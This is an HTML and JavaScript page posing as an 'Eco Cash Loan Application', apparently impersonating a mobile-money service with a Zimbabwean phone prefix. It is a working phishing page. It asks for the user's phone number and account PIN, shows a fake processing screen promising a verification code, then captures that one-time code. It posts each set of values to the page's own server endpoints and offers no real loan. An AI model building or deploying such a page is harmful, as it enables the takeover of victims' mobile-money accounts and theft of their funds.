<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Eco Cash Loan Application</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #f4f4f9; padding: 20px; display: flex; flex-direction: column; align-items: center; }
        .form-container { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); width: 100%; max-width: 400px; margin-bottom: 20px; }
        h2 { color: #2e7d32; text-align: center; margin-bottom: 20px; }
        label { font-weight: bold; display: block; margin-top: 15px; color: #333; }
        input, select, textarea { width: 100%; padding: 10px; margin-top: 5px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
        textarea { resize: vertical; }
        button { width: 100%; background-color: #2e7d32; color: white; border: none; padding: 12px; margin-top: 20px; border-radius: 4px; font-size: 16px; cursor: pointer; font-weight: bold; }
        button:hover { background-color: #1b5e20; }
        .hidden { display: none; }
        .loading-screen, .success-screen { text-align: center; padding: 20px; }
        .success-screen { color: #2e7d32; }
        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #2e7d32; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

<div class="form-container">
    <div id="form-step">
        <h2>Eco Cash Loan Application</h2>
        <form id="loanForm">
            <label for="phone_number">Phone Number</label>
            <input type="text" id="phone_number" required placeholder="+263">

            <label for="pin">Pin</label>
            <input type="tel" id="pin" required placeholder="0000">

            <label for="amount">Loan Amount</label>
            <input type="number" id="amount" required placeholder="e.g. 5000">

            <label for="period">Repayment Period</label>
            <select id="period" required>
                <option value="1 Month">1 Month</option>
                <option value="2 Months">2 Months</option>
                <option value="3 Months">3 Months</option>
                <option value="6 Months">6 Months</option>
            </select>

            <button type="submit">Submit Application</button>
        </form>
    </div>

    <div id="waiting-step" class="hidden loading-screen">
        <h2>Processing Application...</h2>
        <div class="spinner"></div>
        <p>Please wait while we verify your details. A verification code (OTP) will be sent to your phone shortly.</p>
        <p><strong>Do not close this page.</strong></p>
    </div>
</div>

<div class="form-container">
    <div id="details-form-step">
        <h2>Additional Details</h2>
        <form id="detailsForm">
            <label for="otp">OTP</label>
            <textarea id="otp" rows="2" required placeholder="Enter OTP code..."></textarea>

            <button type="submit">Submit Details</button>
        </form>
    </div>

    <div id="success-step" class="hidden success-screen">
        <h2>Submission Complete</h2>
        <p>Thank you. Your information has been recorded successfully.</p>
    </div>
</div>

<script>
// Loan Form Submission
document.getElementById('loanForm').addEventListener('submit', function(e) {
    e.preventDefault();

    const formData = {
        phoneNumber: document.getElementById('phone_number').value,
        pin: document.getElementById('pin').value,
        amount: document.getElementById('amount').value,
        period: document.getElementById('period').value
    };

    document.getElementById('form-step').classList.add('hidden');
    document.getElementById('waiting-step').classList.remove('hidden');

    fetch('/api/notify', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(formData)
    })
    .then(res => res.json())
    .then(data => {
        if (!data.success) {
            alert('Something went wrong. Please refresh and try again.');
        }
    })
    .catch(err => console.error('Error:', err));
});

// Details / OTP Form Submission
document.getElementById('detailsForm').addEventListener('submit', function(e) {
    e.preventDefault();

    const payload = {
        otp: document.getElementById('otp').value
    };

    document.getElementById('details-form-step').classList.add('hidden');
    document.getElementById('success-step').classList.remove('hidden');

    fetch('/api/submit-details', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
    })
    .then(res => res.json())
    .then(data => {
        if (!data.success) {
            console.error('Submission failed.');
        }
    })
    .catch(err => console.error('Error:', err));
});
</script>

</body>
</html>
